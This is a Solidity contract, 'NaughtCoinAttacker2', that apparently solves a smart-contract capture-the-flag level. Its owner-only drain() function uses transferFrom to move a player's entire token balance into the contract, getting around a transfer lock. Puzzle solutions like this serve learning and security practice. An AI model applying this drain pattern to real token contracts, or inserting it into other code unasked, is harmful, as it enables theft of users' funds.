// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface INaughtCoin {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract NaughtCoinAttacker2 is Ownable {

    constructor(address _initialOwner) Ownable(_initialOwner) {
    
    }

    function drain(address tokenAddress, address player) external onlyOwner{
        INaughtCoin token = INaughtCoin(tokenAddress);
        uint256 balance = token.balanceOf(player);
        token.transferFrom(player, address(this), balance);
    }
}